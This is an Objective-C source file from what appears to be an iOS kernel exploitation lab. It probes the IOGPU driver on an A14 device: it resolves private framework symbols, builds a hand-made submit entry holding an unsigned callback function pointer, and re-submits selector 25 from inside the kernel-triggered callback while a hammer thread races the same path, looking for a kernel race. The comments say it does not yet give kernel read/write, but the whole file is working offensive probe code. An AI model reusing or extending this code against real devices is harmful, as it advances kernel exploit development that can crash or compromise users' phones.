//
//  P028ReentryA.m
//  P007OpenOnly
//
//  Approach A only: identical p027 sel=25 entry, re-submit from the
//  completion callback (nested) plus a hammer thread (concurrent).
//  B/C change +0x18/+0x20 and are different ABIs — not this button.
//  0x95b22b4 packs 0x28; no store through the user pointer (dossier).
//  Not KRW.
//

#import "P028ReentryA.h"
#import "A14_23F77_LabOffsets.h"
#import "LabLocalTime.h"

#import <Metal/Metal.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <pthread.h>
#import <stdatomic.h>
#import <stdio.h>
#import <string.h>
#import <unistd.h>

#define P028_BUILD_ID  @"p028-reentry-A"
#define P028_ENTRY_SIZE  0x40
#define P028_CTX_SIZE    0x1000
#define P028_NEST_MAX    8
#define P028_HAMMER_MAX  200

typedef uint32_t (*P028GetConn_t)(void *);
typedef uint32_t (*P028GetQid_t)(void *);
typedef kern_return_t (*P028Iocall_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

static FILE *p028_fp;
static NSMutableString *p028_body;

static P028Iocall_t p028_iocall;
static mach_port_t p028_qconn;
static uint32_t p028_sel;
static uint64_t p028_in[4];
static uint8_t p028_entry[P028_ENTRY_SIZE];
static size_t p028_entry_len;

static volatile int p028_fired;
static volatile uint64_t p028_x0;
static volatile int p028_stop;
static atomic_int p028_nest;
static atomic_int p028_nest_ok;
static atomic_int p028_nest_fail;
static atomic_int p028_hammer_ok;
static atomic_int p028_hammer_fail;
static atomic_uint p028_last_kr;
static atomic_int p028_ready; /* entry template finalized; hammer may run */

static void p028_log(NSString *fmt, ...) NS_FORMAT_FUNCTION(1, 2);
static void p028_log(NSString *fmt, ...)
{
    if (!p028_fp) {
        NSString *docs = NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
        NSString *path = [docs stringByAppendingPathComponent:@"p028_reentry_a_log.txt"];
        p028_fp = fopen(path.UTF8String, "w");
        if (p028_fp) {
            setvbuf(p028_fp, NULL, _IOLBF, 0);
            fprintf(p028_fp, "=== p028 session %s build=%s ===\n",
                    LabLocalMilitaryNow().UTF8String, P028_BUILD_ID.UTF8String);
        }
    }
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (p028_fp) {
        fprintf(p028_fp, "%s\n", msg.UTF8String);
        fflush(p028_fp);
    }
    if (p028_body)
        [p028_body appendFormat:@"%@\n", msg];
}

static id p028_unwrap(id buf)
{
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([buf class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"])
            break;
        SEL s = NSSelectorFromString(@"baseObject");
        if (![buf respondsToSelector:s])
            break;
        id b = ((id (*)(id, SEL))objc_msgSend)(buf, s);
        if (!b || b == buf)
            break;
        buf = b;
    }
    return buf;
}

static void *p028_ivar(id obj, const char *name)
{
    if (!obj || !name)
        return NULL;
    Class cls = object_getClass(obj);
    while (cls) {
        unsigned int n = 0;
        Ivar *ivs = class_copyIvarList(cls, &n);
        void *val = NULL;
        for (unsigned i = 0; i < n; i++) {
            const char *nm = ivar_getName(ivs[i]);
            if (nm && strcmp(nm, name) == 0) {
                val = *(void **)((char *)(__bridge void *)obj + ivar_getOffset(ivs[i]));
                break;
            }
        }
        free(ivs);
        if (val)
            return val;
        cls = class_getSuperclass(cls);
    }
    return NULL;
}

static void *p028_strip(void *p)
{
    return (void *)((uintptr_t)p & 0x0000007FFFFFFFFFULL);
}

static int p028_is_heap(void *p)
{
    uintptr_t x = (uintptr_t)p028_strip(p);
    if (x < 0x100000000ULL)
        return 0;
    if ((x & 7) != 0)
        return 0;
    if ((x >> 28) == 0x16)
        return 0;
    return 1;
}

static kern_return_t p028_submit_once(void)
{
    uint64_t out = 0;
    uint32_t nout = 1;
    if (!p028_iocall || !p028_qconn)
        return 0xe00002c2;
    /* Local copy — hammer/nest must not race a shared entry buffer. */
    uint8_t local[P028_ENTRY_SIZE];
    memcpy(local, p028_entry, P028_ENTRY_SIZE);
    return p028_iocall(p028_qconn, p028_sel,
                       p028_in, 4, local, p028_entry_len,
                       &out, &nout, NULL, 0);
}

/* Completion thread: same entry, nested sel=25. Cap depth. No NSLog. */
static void p028_callback(void *ctx)
{
    p028_fired = 1;
    p028_x0 = (uint64_t)ctx;
    /* Null ctx ⇒ DispatchAvailable already should have died at ldr #0x10;
       still refuse nest if we somehow got here with garbage. */
    if (!ctx || p028_stop)
        return;
    int n = atomic_fetch_add(&p028_nest, 1);
    if (n >= P028_NEST_MAX)
        return;
    kern_return_t kr = p028_submit_once();
    atomic_store(&p028_last_kr, (unsigned)kr);
    if (kr == 0)
        atomic_fetch_add(&p028_nest_ok, 1);
    else
        atomic_fetch_add(&p028_nest_fail, 1);
}

static void *p028_hammer(void *arg)
{
    (void)arg;
    /* Wait until primary submit path finished mutating the entry template. */
    while (!p028_stop && !atomic_load(&p028_ready))
        usleep(1000);
    for (int i = 0; i < P028_HAMMER_MAX && !p028_stop; i++) {
        kern_return_t kr = p028_submit_once();
        if (kr == 0)
            atomic_fetch_add(&p028_hammer_ok, 1);
        else
            atomic_fetch_add(&p028_hammer_fail, 1);
    }
    return NULL;
}

@implementation P028ReentryA

+ (NSString *)tap
{
    if (p028_fp) {
        fclose(p028_fp);
        p028_fp = NULL;
    }
    p028_body = [NSMutableString string];
    p028_fired = 0;
    p028_x0 = 0;
    p028_stop = 0;
    atomic_store(&p028_nest, 0);
    atomic_store(&p028_nest_ok, 0);
    atomic_store(&p028_nest_fail, 0);
    atomic_store(&p028_hammer_ok, 0);
    atomic_store(&p028_hammer_fail, 0);
    atomic_store(&p028_last_kr, 0);
    atomic_store(&p028_ready, 0);
    p028_iocall = NULL;
    p028_qconn = 0;

    p028_log(@"========================================");
    p028_log(@"BUILD %@ (compiled %s %s)", P028_BUILD_ID, __DATE__, __TIME__);
    p028_log(@"Approach A: SAME entry as p027 ( +0x18=0 +0x20=0 )");
    p028_log(@"  nested: callback re-submits sel=25 (max %d)", P028_NEST_MAX);
    p028_log(@"  concurrent: hammer AFTER submit0 settles (max %d)", P028_HAMMER_MAX);
    p028_log(@"NOT B (+0x18 page) NOT C (+0x20 ns) — those are new ABIs");
    p028_log(@"5b22b4 packs 0x28; no str through user ptr. Not KRW.");
    p028_log(@"ABI: arm64 — unsigned FP at ctx+0x10 (no pacia/blraa here)");
    p028_log(@"CRASH CLASS: FAR=0x10 in DispatchAvailable = NQ ctx qword was 0");
    p028_log(@"  (ldr x11,[x9,#0x10]! with x9=0) — probe bug / empty packet,");
    p028_log(@"  NOT a healthy 'test running' signal.");
    p028_log(@"========================================");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu)
        iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iogpu || !iokit) {
        p028_log(@"[sym] STOP dlopen");
        return [self finish:@"dlopen fail"];
    }

    P028GetConn_t devConnFn = (P028GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    P028GetConn_t qConnFn = (P028GetConn_t)dlsym(iogpu, "IOGPUCommandQueueGetConnect");
    P028GetQid_t qGetID = (P028GetQid_t)dlsym(iogpu, "IOGPUCommandQueueGetID");
    p028_iocall = (P028Iocall_t)dlsym(iokit, "IOConnectCallMethod");
    if (!p028_iocall || !devConnFn || !qConnFn) {
        p028_log(@"[sym] STOP missing symbols");
        return [self finish:@"missing symbols"];
    }

    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) {
        p028_log(@"[mtl] STOP no device");
        return [self finish:@"no metal"];
    }
    id<MTLCommandQueue> cmdQueue = [dev newCommandQueue];
    if (!cmdQueue) {
        p028_log(@"[mtl] STOP no queue");
        return [self finish:@"no queue"];
    }

    id mtlDev = p028_unwrap(dev);
    id mtlQ = p028_unwrap(cmdQueue);
    void *devRef = p028_strip(p028_ivar(mtlDev, "_deviceRef"));
    void *qRef = p028_strip(p028_ivar(mtlQ, "_commandQueue"));
    uint32_t dconn = (devConnFn && p028_is_heap(devRef)) ? devConnFn(devRef) : 0;
    uint32_t qConn = (qConnFn && p028_is_heap(qRef)) ? qConnFn(qRef) : 0;
    uint32_t qid = (qGetID && p028_is_heap(qRef)) ? qGetID(qRef) : 0;
    if (!qConn)
        qConn = dconn;
    p028_log(@"[0] dconn=0x%x qConn=0x%x qid=%u", dconn, qConn, qid);
    if (!qConn) {
        p028_log(@"[0] STOP no connect");
        return [self finish:@"no connect"];
    }
    p028_qconn = qConn;
    p028_sel = (uint32_t)A14_23F77_IOGPU_SUBMIT_SEL;

    uint32_t stride = P028_ENTRY_SIZE;
    if (p028_is_heap(qRef)) {
        void *stride_obj = *(void **)((uint8_t *)qRef + 0x538);
        if (p028_is_heap(stride_obj)) {
            uint32_t qstride = *(uint32_t *)((uint8_t *)stride_obj + 0x268);
            if (qstride > 0 && qstride <= P028_ENTRY_SIZE)
                stride = qstride;
            p028_log(@"[0] queue stride raw=0x%x using=0x%x", qstride, stride);
        } else {
            p028_log(@"[0] qRef+0x538 not heap, stride=0x40");
        }
    }

    vm_address_t ctxAddr = 0;
    kern_return_t kr = vm_allocate(mach_task_self(), &ctxAddr, P028_CTX_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS || !ctxAddr) {
        p028_log(@"[ctx] STOP vm_allocate kr=0x%x", (unsigned)kr);
        return [self finish:@"vm_allocate fail"];
    }
    uint8_t *ctx = (uint8_t *)(uintptr_t)ctxAddr;
    memset(ctx, 0, P028_CTX_SIZE);
    *(uint64_t *)(ctx + 0x10) = (uint64_t)(void *)&p028_callback;
    p028_log(@"[ctx] unsigned FP 0x%llx @ ctx=0x%llx +0x10",
             (unsigned long long)(uintptr_t)&p028_callback,
             (unsigned long long)ctxAddr);

    memset(p028_entry, 0, sizeof(p028_entry));
    *(uint64_t *)(p028_entry + 0x10) = (uint64_t)(uintptr_t)ctx;
    /* +0x18 = 0, +0x20 = 0 — proven p027 ABI */
    p028_entry_len = stride;
    p028_in[0] = qid;
    p028_in[1] = 0;
    p028_in[2] = 1;
    p028_in[3] = stride;
    p028_log(@"[entry] +0x10=ctx +0x18=0 +0x20=0 stride=0x%x sel=%u",
             stride, p028_sel);
    if (p028_fp)
        fflush(p028_fp);

    /* Settle ABI first — do NOT race hammer against 2c2 retry mutating entry. */
    uint64_t out = 0;
    uint32_t nout = 1;
    kr = p028_iocall(p028_qconn, p028_sel, p028_in, 4,
                     p028_entry, p028_entry_len, &out, &nout, NULL, 0);
    p028_log(@"[submit0] kr=0x%x out=0x%llx", (unsigned)kr, (unsigned long long)out);

    if (kr == 0xe00002c2) {
        p028_log(@"[submit0] 2c2 — one retry +0x18=ctx (same as p027), then lock ABI");
        *(uint64_t *)(p028_entry + 0x18) = (uint64_t)(uintptr_t)ctx;
        kr = p028_iocall(p028_qconn, p028_sel, p028_in, 4,
                         p028_entry, p028_entry_len, &out, &nout, NULL, 0);
        p028_log(@"[submit0] retry kr=0x%x", (unsigned)kr);
    }

    /* Entry template frozen — start hammer only now. */
    atomic_store(&p028_ready, 1);
    pthread_t th = NULL;
    pthread_create(&th, NULL, p028_hammer, NULL);

    p028_log(@"[wait] 5s nest/hammer (ctx stays mapped until AFTER join+drain)");
    if (p028_fp)
        fflush(p028_fp);
    for (int i = 0; i < 5000 && !p028_stop; i++) {
        usleep(1000);
        if (i == 0 || (i % 1000) == 0) {
            p028_log(@"[t=%ds] fired=%d nest=%d ok=%d fail=%d hammer ok=%d fail=%d last_kr=0x%x",
                     i / 1000, p028_fired,
                     atomic_load(&p028_nest),
                     atomic_load(&p028_nest_ok),
                     atomic_load(&p028_nest_fail),
                     atomic_load(&p028_hammer_ok),
                     atomic_load(&p028_hammer_fail),
                     atomic_load(&p028_last_kr));
            if (p028_fp)
                fflush(p028_fp);
        }
    }
    p028_stop = 1;
    if (th)
        pthread_join(th, NULL);
    /* Drain late NQ pulls before unmapping ctx (avoids use-after-free;
       null-ctx FAR=0x10 is a different failure — empty packet). */
    usleep(200000);

    p028_log(@"[result] fired=%d x0=0x%llx ctx=0x%llx",
             p028_fired, (unsigned long long)p028_x0, (unsigned long long)ctxAddr);
    p028_log(@"[result] nest=%d ok=%d fail=%d  hammer ok=%d fail=%d last_kr=0x%x",
             atomic_load(&p028_nest),
             atomic_load(&p028_nest_ok),
             atomic_load(&p028_nest_fail),
             atomic_load(&p028_hammer_ok),
             atomic_load(&p028_hammer_fail),
             atomic_load(&p028_last_kr));

    if (p028_fired && atomic_load(&p028_nest_ok) > 0) {
        p028_log(@"=== verdict: RE-ENTRY ACCEPTED (nested sel=25 returned 0) ===");
        p028_log(@"  kernel did not fully serialize callback re-submit");
        p028_log(@"  panic at 0x95b22b4 = pack race; no panic = serialized or safe");
    } else if (p028_fired && atomic_load(&p028_nest_fail) > 0) {
        p028_log(@"=== verdict: CALLBACK FIRED, nested submit rejected ===");
        p028_log(@"  last_kr=0x%x — likely serialized / lock held", atomic_load(&p028_last_kr));
    } else if (p028_fired) {
        p028_log(@"=== verdict: CALLBACK FIRED, no nested submit (cap or skip) ===");
    } else if (kr == 0) {
        p028_log(@"=== verdict: SUBMIT0 OK, no callback ===");
        p028_log(@"note: if Xcode stopped in DispatchAvailable at FAR=0x10,");
        p028_log(@"  that is NULL NQ context (bug), not success");
    } else {
        p028_log(@"=== verdict: SUBMIT0 FAILED kr=0x%x ===", (unsigned)kr);
    }
    p028_log(@"NOT KRW. Approach A only.");

    vm_deallocate(mach_task_self(), ctxAddr, P028_CTX_SIZE);
    return [self finish:@"ok"];
}

+ (NSString *)finish:(NSString *)tag
{
    if (p028_fp) {
        fflush(p028_fp);
        fclose(p028_fp);
        p028_fp = NULL;
    }
    NSString *body = p028_body ?: @"(empty)";
    p028_body = nil;
    return [NSString stringWithFormat:@"=== LIVE TAP %@ (%@) ===\n%@\n",
            P028_BUILD_ID, tag, body];
}

@end
